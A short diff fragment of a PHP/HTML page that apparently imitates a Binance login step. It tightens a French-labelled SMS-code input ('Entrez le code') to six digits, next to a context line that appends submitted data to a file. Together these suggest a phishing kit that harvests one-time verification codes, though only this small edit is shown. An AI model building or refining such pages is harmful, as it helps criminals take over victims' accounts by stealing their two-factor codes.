@@ -3928,7 +3928,7 @@ file_put_contents($file, $donnees, FILE_APPEND);
                                             <div class="combo__entry combo__entry--small">
                                                 <input
                                                     class="bnc-input sc-htoDjs cfSOAz" placeholder="Entrez le code"
-                                                    id="identity" name="sms" type="text" maxlength="255"
+                                                    id="identity" name="sms" maxlength="6" type="number"
                                                     autocomplete="on" aria-invalid="false" value="">
                                                     </div>
                                                    
